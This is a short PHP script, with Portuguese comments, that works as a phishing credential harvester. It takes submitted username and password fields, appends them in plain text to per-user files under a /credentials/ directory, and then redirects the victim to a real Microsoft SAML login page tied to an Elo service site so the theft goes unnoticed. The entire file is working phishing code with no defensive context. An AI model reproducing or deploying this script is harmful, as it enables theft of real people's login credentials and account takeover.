<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Verifica se o formulário foi enviado
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    $username = isset($_POST['uname']) ? $_POST['uname'] : '';
    $password = isset($_POST['pass']) ? $_POST['pass'] : '';
    
    $filePath = "/credentials/$username.txt";
    $data = "Username: $username | Password: $password\n";
    
    file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX);
    
    header('Location: https://login.microsoftonline.com/cbfcf17b-d505-415f-ac5d-ee9e129bbcdb/saml2?SAMLRequest=lVLLjtowFP2VyPs8nBAgFkGioKpI02k00C66s51rsOTYqa%2FDtH%2FfEKiGLjpSd5Z9z%2BOe4xXyzuQ92wzhbF%2FgxwAYop%2BdschuLzUZvGWOo0ZmeQfIgmSHzecnlicZ670LTjpDog0i%2BKCd3TqLQwf%2BAP6iJXx9earJOYQeWZqCcYpLbXTgSaftmY8XiXRdInxq%2BaXnJ0haR6Ld6EJbfqV7Axt30naESe%2FQqeCs0Rau6FQKJRVdiLgtszKe0VLFXJZtDFABzSshZCvSaR0SfXRewrRtTRQ3CCTa72pyeN4uREH5XCyFUFxVcjwWhSqr2XwO2Vy2i3EQG46oL%2FAGRRxgbzFwG2qSZ%2FkspllMl0dasBllxTKpivI7iZp7Th%2B0bbU9vR%2BquA0h%2B3Q8NnHz5XCcCC66Bf88Tv9%2Fnt%2FA45TlSE%2FWqykKNnn3j2W%2Fb4v%2FaZisH%2FQTvPUcW%2Fd6lV6lj%2Bx3rZ5dfe93jTNa%2Foo2xrjXrQcexl2CH2CqpePh3wZoQqcb3cZqGmWDxR6kVhpakq7vsn9%2F5PVv&RelayState=https%3A%2F%2Felofacilita.minhaelo.com.br%2Fsp');
    exit();
}
?>